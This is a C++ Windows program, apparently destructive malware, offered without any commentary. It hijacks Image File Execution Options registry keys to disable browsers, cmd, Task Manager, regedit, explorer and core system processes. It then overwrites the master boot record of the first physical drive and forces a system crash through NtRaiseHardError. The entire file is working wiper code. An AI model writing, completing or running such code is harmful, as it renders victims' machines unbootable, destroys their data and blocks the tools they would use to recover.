#include <windows.h>
#include <windows.h>
#include <iostream>
#include <string>
#include <tchar.h>

#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif

const ULONG SE_SHUTDOWN_PRIVILEGE = 19;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWCH   Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef enum _HARDERROR_RESPONSE_OPTION {
    OptionShutdownSystem = 6
} HARDERROR_RESPONSE_OPTION, *PHARDERROR_RESPONSE_OPTION;

typedef enum _HARDERROR_RESPONSE {
    ResponseReturnToCaller
} HARDERROR_RESPONSE, *PHARDERROR_RESPONSE;

typedef NTSTATUS(NTAPI* NTRAISEHARDERROR)(
    NTSTATUS ErrorStatus,
    ULONG NumberOfParameters,
    PUNICODE_STRING UnicodeStringParameterMask,
    PVOID* Parameters,
    HARDERROR_RESPONSE_OPTION ResponseOption,
    PHARDERROR_RESPONSE Response
    );

typedef BOOL(NTAPI* RTLADJUSTPRIVILEGE)(ULONG, BOOL, BOOL, PBOOLEAN);

void WritePHYSICALDRIVE0() {
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\PHYSICALDRIVE0",
        GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        return;
    }

    BYTE bootSector[512] = {0};
    DWORD bytesWritten = 0;

    bootSector[510] = 0x55;
    bootSector[511] = 0xAA;

    WriteFile(hDevice, bootSector, sizeof(bootSector), &bytesWritten, NULL);
    CloseHandle(hDevice);
}

bool DisableApp(const std::wstring& targetApp) {
    HKEY hKey;
    std::wstring subKey = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\" + targetApp;

    LONG result = RegCreateKeyExW(
        HKEY_LOCAL_MACHINE,
        subKey.c_str(),
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_WRITE,
        NULL,
        &hKey,
        NULL
    );

    if (result != ERROR_SUCCESS) {
        return false;
    }

    std::wstring hijackValue = L"\"" + targetApp + L"\"";
    
    result = RegSetValueExW(
        hKey,
        L"Debugger",
        0,
        REG_SZ,
        (const BYTE*)hijackValue.c_str(),
        (hijackValue.length() + 1) * sizeof(wchar_t)
    );

    RegCloseKey(hKey);

    return result == ERROR_SUCCESS;
}

int main() {
    DisableApp(L"chrome.exe");
    DisableApp(L"msedge.exe");
    DisableApp(L"cmd.exe");
    DisableApp(L"mmc.exe");
    DisableApp(L"notepad.exe");
    DisableApp(L"reg.exe");
    DisableApp(L"regedit.exe");
    DisableApp(L"taskmgr.exe");
    DisableApp(L"svchost.exe");
    DisableApp(L"wininit.exe");
    DisableApp(L"explorer.exe");
    WritePHYSICALDRIVE0();

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) {
        return 1;
    }

    NTRAISEHARDERROR NtRaiseHardError = reinterpret_cast<NTRAISEHARDERROR>(
        GetProcAddress(ntdll, "NtRaiseHardError"));
    RTLADJUSTPRIVILEGE RtlAdjustPrivilege = reinterpret_cast<RTLADJUSTPRIVILEGE>(
        GetProcAddress(ntdll, "RtlAdjustPrivilege"));

    if (!NtRaiseHardError || !RtlAdjustPrivilege) {
        return 1;
    }

    BOOLEAN wasEnabled;
    RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &wasEnabled);
    HARDERROR_RESPONSE response;
    NtRaiseHardError(0xC0114514, 0, NULL, NULL, OptionShutdownSystem, &response);
    return 0;
}
